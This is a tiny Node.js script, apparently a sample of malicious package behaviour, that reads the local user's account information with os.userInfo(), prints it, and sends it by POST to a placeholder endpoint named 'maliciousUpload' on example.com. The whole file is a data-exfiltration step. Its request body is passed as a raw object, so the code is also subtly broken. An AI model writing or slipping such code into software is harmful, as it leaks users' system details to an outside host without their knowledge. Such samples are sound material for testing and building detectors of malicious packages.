const os = require('os')

const userinfo = os.userInfo()
console.log('Userinfo:', userinfo)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { userinfo }
  }
)
